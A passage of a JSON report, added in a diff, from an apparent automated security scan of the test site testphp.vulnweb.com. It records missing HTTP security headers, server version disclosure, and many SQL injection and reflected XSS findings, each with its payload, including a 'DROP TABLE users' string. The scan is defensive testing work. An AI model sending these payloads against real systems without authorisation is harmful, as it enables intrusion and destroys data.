@@ -1,0 +1,2468 @@
+{
+  "scan_metadata": {
+    "timestamp": "2025-06-05T14:03:08.394505",
+    "target_url": "http://testphp.vulnweb.com",
+    "scan_type": "security_scan"
+  },
+  "discovered_urls": [
+    "http://testphp.vulnweb.com/search.php?test=query",
+    "http://testphp.vulnweb.com/Mod_Rewrite_Shop",
+    "http://testphp.vulnweb.com/index.php",
+    "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php",
+    "http://testphp.vulnweb.com/artists.php",
+    "http://testphp.vulnweb.com/login.php",
+    "http://testphp.vulnweb.com/guestbook.php",
+    "http://testphp.vulnweb.com/cart.php",
+    "http://testphp.vulnweb.com/categories.php",
+    "http://testphp.vulnweb.com/hpp",
+    "http://testphp.vulnweb.com/AJAX/index.php",
+    "http://testphp.vulnweb.com/",
+    "http://testphp.vulnweb.com/disclaimer.php"
+  ],
+  "results": [
+    {
+      "description": "Prevents XSS attacks",
+      "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+      "header": "Content-Security-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Content-Security-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "description": "Prevents MIME-type sniffing",
+      "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+      "header": "X-Content-Type-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Content-Type-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "description": "Protects against clickjacking",
+      "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+      "header": "X-Frame-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Frame-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "description": "Enforces HTTPS",
+      "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+      "header": "Strict-Transport-Security",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Strict-Transport-Security",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "description": "Controls how much referrer info is shared",
+      "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+      "header": "Referrer-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Referrer-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "description": "Cross-domain policy control",
+      "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+      "header": "X-Permitted-Cross-Domain-Policies",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "description": "XSS protection",
+      "evidence": "X-XSS-Protection header not present - XSS protection",
+      "header": "X-XSS-Protection",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-XSS-Protection",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "description": "Server header reveals server information",
+      "evidence": "Server header reveals server information",
+      "header": "Server",
+      "location": "Server header",
+      "payload": "Server: nginx/1.19.0",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "description": "X-Powered-By header reveals server information",
+      "evidence": "X-Powered-By header reveals server information",
+      "header": "X-Powered-By",
+      "location": "X-Powered-By header",
+      "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "payload": "\" OR \"1\"=\"1",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test=\" OR \"1\"=\"1"
+    },
+    {
+      "payload": "' OR 1=1/*",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1/*"
+    },
+    {
+      "payload": "' OR 1=1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1--"
+    },
+    {
+      "payload": "' OR 1=1#",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1#"
+    },
+    {
+      "payload": "' OR '1'='1' -- ",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test=' OR '1'='1' -- "
+    },
+    {
+      "payload": "' OR 'a'='a",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test=' OR 'a'='a"
+    },
+    {
+      "payload": "' AND SLEEP(3)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test=' AND SLEEP(3)--"
+    },
+    {
+      "payload": "' OR EXISTS(SELECT * FROM users)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test=' OR EXISTS(SELECT * FROM users)--"
+    },
+    {
+      "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test=' OR (SELECT COUNT(*) FROM users) > 0--"
+    },
+    {
+      "payload": "'; DROP TABLE users--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test='; DROP TABLE users--"
+    },
+    {
+      "payload": "' OR 1=1 LIMIT 1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test=' OR 1=1 LIMIT 1--"
+    },
+    {
+      "payload": "' AND 1=0 UNION SELECT NULL--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query?test=' AND 1=0 UNION SELECT NULL--"
+    },
+    {
+      "location": "POST parameter: searchFor",
+      "payload": "<script>alert('XSS')</script>",
+      "severity": "High",
+      "type": "Reflected XSS (POST)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "location": "POST parameter: searchFor",
+      "payload": "<body onload=alert('XSS')>",
+      "severity": "High",
+      "type": "Reflected XSS (POST)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "location": "POST parameter: searchFor",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "severity": "High",
+      "type": "Reflected XSS (POST)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "location": "POST parameter: searchFor",
+      "payload": "<iframe src=javascript:alert('XSS')>",
+      "severity": "High",
+      "type": "Reflected XSS (POST)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "location": "POST parameter: searchFor",
+      "payload": "<input type=image src=x onerror=alert('XSS')>",
+      "severity": "High",
+      "type": "Reflected XSS (POST)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "location": "POST parameter: searchFor",
+      "payload": "<object data=javascript:alert('XSS')>",
+      "severity": "High",
+      "type": "Reflected XSS (POST)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "location": "POST parameter: searchFor",
+      "payload": "<marquee onstart=alert('XSS')>",
+      "severity": "High",
+      "type": "Reflected XSS (POST)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "location": "POST parameter: searchFor",
+      "payload": "<details open ontoggle=alert('XSS')>",
+      "severity": "High",
+      "type": "Reflected XSS (POST)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "location": "POST parameter: searchFor",
+      "payload": "javascript:alert('XSS')",
+      "severity": "High",
+      "type": "Reflected XSS (POST)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "location": "POST parameter: searchFor",
+      "payload": "<svg onload=alert('XSS')>",
+      "severity": "High",
+      "type": "Reflected XSS (POST)",
+      "url": "http://testphp.vulnweb.com/search.php?test=query"
+    },
+    {
+      "description": "Prevents XSS attacks",
+      "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+      "header": "Content-Security-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Content-Security-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php"
+    },
+    {
+      "description": "Prevents MIME-type sniffing",
+      "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+      "header": "X-Content-Type-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Content-Type-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php"
+    },
+    {
+      "description": "Protects against clickjacking",
+      "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+      "header": "X-Frame-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Frame-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php"
+    },
+    {
+      "description": "Enforces HTTPS",
+      "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+      "header": "Strict-Transport-Security",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Strict-Transport-Security",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php"
+    },
+    {
+      "description": "Controls how much referrer info is shared",
+      "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+      "header": "Referrer-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Referrer-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php"
+    },
+    {
+      "description": "Cross-domain policy control",
+      "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+      "header": "X-Permitted-Cross-Domain-Policies",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php"
+    },
+    {
+      "description": "XSS protection",
+      "evidence": "X-XSS-Protection header not present - XSS protection",
+      "header": "X-XSS-Protection",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-XSS-Protection",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php"
+    },
+    {
+      "description": "Server header reveals server information",
+      "evidence": "Server header reveals server information",
+      "header": "Server",
+      "location": "Server header",
+      "payload": "Server: nginx/1.19.0",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php"
+    },
+    {
+      "description": "X-Powered-By header reveals server information",
+      "evidence": "X-Powered-By header reveals server information",
+      "header": "X-Powered-By",
+      "location": "X-Powered-By header",
+      "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php"
+    },
+    {
+      "payload": "' OR 1=1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1--"
+    },
+    {
+      "payload": "' OR 'a'='a",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 'a'='a"
+    },
+    {
+      "payload": "' OR 1=1#",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1#"
+    },
+    {
+      "payload": "' OR 1=1/*",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1/*"
+    },
+    {
+      "payload": "' OR '1'='1' -- ",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR '1'='1' -- "
+    },
+    {
+      "payload": "' OR EXISTS(SELECT * FROM users)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR EXISTS(SELECT * FROM users)--"
+    },
+    {
+      "payload": "' AND SLEEP(3)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' AND SLEEP(3)--"
+    },
+    {
+      "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR (SELECT COUNT(*) FROM users) > 0--"
+    },
+    {
+      "payload": "' OR 1=1 LIMIT 1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' OR 1=1 LIMIT 1--"
+    },
+    {
+      "payload": "' AND 1=0 UNION SELECT NULL--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=' AND 1=0 UNION SELECT NULL--"
+    },
+    {
+      "payload": "\" OR \"1\"=\"1",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test=\" OR \"1\"=\"1"
+    },
+    {
+      "payload": "'; DROP TABLE users--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/Templates/main_dynamic_template.dwt.php?test='; DROP TABLE users--"
+    },
+    {
+      "description": "Prevents XSS attacks",
+      "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+      "header": "Content-Security-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Content-Security-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/index.php"
+    },
+    {
+      "description": "Prevents MIME-type sniffing",
+      "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+      "header": "X-Content-Type-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Content-Type-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/index.php"
+    },
+    {
+      "description": "Protects against clickjacking",
+      "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+      "header": "X-Frame-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Frame-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/index.php"
+    },
+    {
+      "description": "Enforces HTTPS",
+      "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+      "header": "Strict-Transport-Security",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Strict-Transport-Security",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/index.php"
+    },
+    {
+      "description": "Controls how much referrer info is shared",
+      "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+      "header": "Referrer-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Referrer-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/index.php"
+    },
+    {
+      "description": "Cross-domain policy control",
+      "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+      "header": "X-Permitted-Cross-Domain-Policies",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/index.php"
+    },
+    {
+      "description": "XSS protection",
+      "evidence": "X-XSS-Protection header not present - XSS protection",
+      "header": "X-XSS-Protection",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-XSS-Protection",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/index.php"
+    },
+    {
+      "description": "Server header reveals server information",
+      "evidence": "Server header reveals server information",
+      "header": "Server",
+      "location": "Server header",
+      "payload": "Server: nginx/1.19.0",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/index.php"
+    },
+    {
+      "description": "X-Powered-By header reveals server information",
+      "evidence": "X-Powered-By header reveals server information",
+      "header": "X-Powered-By",
+      "location": "X-Powered-By header",
+      "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/index.php"
+    },
+    {
+      "payload": "' OR 'a'='a",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test=' OR 'a'='a"
+    },
+    {
+      "payload": "' OR 1=1/*",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test=' OR 1=1/*"
+    },
+    {
+      "payload": "'; DROP TABLE users--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test='; DROP TABLE users--"
+    },
+    {
+      "payload": "' OR 1=1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test=' OR 1=1--"
+    },
+    {
+      "payload": "\" OR \"1\"=\"1",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test=\" OR \"1\"=\"1"
+    },
+    {
+      "payload": "' OR 1=1#",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test=' OR 1=1#"
+    },
+    {
+      "payload": "' AND SLEEP(3)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test=' AND SLEEP(3)--"
+    },
+    {
+      "payload": "' OR '1'='1' -- ",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test=' OR '1'='1' -- "
+    },
+    {
+      "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test=' OR (SELECT COUNT(*) FROM users) > 0--"
+    },
+    {
+      "payload": "' OR EXISTS(SELECT * FROM users)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test=' OR EXISTS(SELECT * FROM users)--"
+    },
+    {
+      "payload": "' OR 1=1 LIMIT 1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test=' OR 1=1 LIMIT 1--"
+    },
+    {
+      "payload": "' AND 1=0 UNION SELECT NULL--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/index.php?test=' AND 1=0 UNION SELECT NULL--"
+    },
+    {
+      "description": "Prevents XSS attacks",
+      "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+      "header": "Content-Security-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Content-Security-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/hpp"
+    },
+    {
+      "description": "Prevents MIME-type sniffing",
+      "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+      "header": "X-Content-Type-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Content-Type-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/hpp"
+    },
+    {
+      "description": "Protects against clickjacking",
+      "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+      "header": "X-Frame-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Frame-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/hpp"
+    },
+    {
+      "description": "Enforces HTTPS",
+      "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+      "header": "Strict-Transport-Security",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Strict-Transport-Security",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/hpp"
+    },
+    {
+      "description": "Controls how much referrer info is shared",
+      "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+      "header": "Referrer-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Referrer-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/hpp"
+    },
+    {
+      "description": "Cross-domain policy control",
+      "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+      "header": "X-Permitted-Cross-Domain-Policies",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/hpp"
+    },
+    {
+      "description": "XSS protection",
+      "evidence": "X-XSS-Protection header not present - XSS protection",
+      "header": "X-XSS-Protection",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-XSS-Protection",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/hpp"
+    },
+    {
+      "description": "Server header reveals server information",
+      "evidence": "Server header reveals server information",
+      "header": "Server",
+      "location": "Server header",
+      "payload": "Server: nginx/1.19.0",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/hpp"
+    },
+    {
+      "description": "X-Powered-By header reveals server information",
+      "evidence": "X-Powered-By header reveals server information",
+      "header": "X-Powered-By",
+      "location": "X-Powered-By header",
+      "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/hpp"
+    },
+    {
+      "description": "Prevents XSS attacks",
+      "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+      "header": "Content-Security-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Content-Security-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/guestbook.php"
+    },
+    {
+      "description": "Prevents MIME-type sniffing",
+      "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+      "header": "X-Content-Type-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Content-Type-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/guestbook.php"
+    },
+    {
+      "description": "Protects against clickjacking",
+      "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+      "header": "X-Frame-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Frame-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/guestbook.php"
+    },
+    {
+      "description": "Enforces HTTPS",
+      "evidence": "Strict-Transport-Security header not present - Enforces HTTPS",
+      "header": "Strict-Transport-Security",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Strict-Transport-Security",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/guestbook.php"
+    },
+    {
+      "description": "Controls how much referrer info is shared",
+      "evidence": "Referrer-Policy header not present - Controls how much referrer info is shared",
+      "header": "Referrer-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Referrer-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/guestbook.php"
+    },
+    {
+      "description": "Cross-domain policy control",
+      "evidence": "X-Permitted-Cross-Domain-Policies header not present - Cross-domain policy control",
+      "header": "X-Permitted-Cross-Domain-Policies",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Permitted-Cross-Domain-Policies",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/guestbook.php"
+    },
+    {
+      "description": "XSS protection",
+      "evidence": "X-XSS-Protection header not present - XSS protection",
+      "header": "X-XSS-Protection",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-XSS-Protection",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/guestbook.php"
+    },
+    {
+      "description": "Server header reveals server information",
+      "evidence": "Server header reveals server information",
+      "header": "Server",
+      "location": "Server header",
+      "payload": "Server: nginx/1.19.0",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/guestbook.php"
+    },
+    {
+      "description": "X-Powered-By header reveals server information",
+      "evidence": "X-Powered-By header reveals server information",
+      "header": "X-Powered-By",
+      "location": "X-Powered-By header",
+      "payload": "X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1",
+      "severity": "Low",
+      "type": "Information Disclosure",
+      "url": "http://testphp.vulnweb.com/guestbook.php"
+    },
+    {
+      "payload": "'; DROP TABLE users--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test='; DROP TABLE users--"
+    },
+    {
+      "payload": "' OR 1=1/*",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1/*"
+    },
+    {
+      "payload": "' OR 'a'='a",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test=' OR 'a'='a"
+    },
+    {
+      "payload": "\" OR \"1\"=\"1",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test=\" OR \"1\"=\"1"
+    },
+    {
+      "payload": "' OR 1=1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1--"
+    },
+    {
+      "payload": "' OR '1'='1' -- ",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test=' OR '1'='1' -- "
+    },
+    {
+      "payload": "' OR 1=1#",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1#"
+    },
+    {
+      "payload": "' AND SLEEP(3)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test=' AND SLEEP(3)--"
+    },
+    {
+      "payload": "' AND 1=0 UNION SELECT NULL--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test=' AND 1=0 UNION SELECT NULL--"
+    },
+    {
+      "payload": "' OR 1=1 LIMIT 1--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test=' OR 1=1 LIMIT 1--"
+    },
+    {
+      "payload": "' OR EXISTS(SELECT * FROM users)--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test=' OR EXISTS(SELECT * FROM users)--"
+    },
+    {
+      "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
+      "severity": "High",
+      "type": "SQL Injection (Error-Based)",
+      "url": "http://testphp.vulnweb.com/guestbook.php?test=' OR (SELECT COUNT(*) FROM users) > 0--"
+    },
+    {
+      "description": "Prevents XSS attacks",
+      "evidence": "Content-Security-Policy header not present - Prevents XSS attacks",
+      "header": "Content-Security-Policy",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: Content-Security-Policy",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/cart.php"
+    },
+    {
+      "description": "Prevents MIME-type sniffing",
+      "evidence": "X-Content-Type-Options header not present - Prevents MIME-type sniffing",
+      "header": "X-Content-Type-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Content-Type-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/cart.php"
+    },
+    {
+      "description": "Protects against clickjacking",
+      "evidence": "X-Frame-Options header not present - Protects against clickjacking",
+      "header": "X-Frame-Options",
+      "location": "HTTP Response Headers",
+      "payload": "Missing: X-Frame-Options",
+      "severity": "Medium",
+      "type": "Missing Security Header",
+      "url": "http://testphp.vulnweb.com/cart.php"
+    },
+    {
+      "description": "Enforces HTTPS",
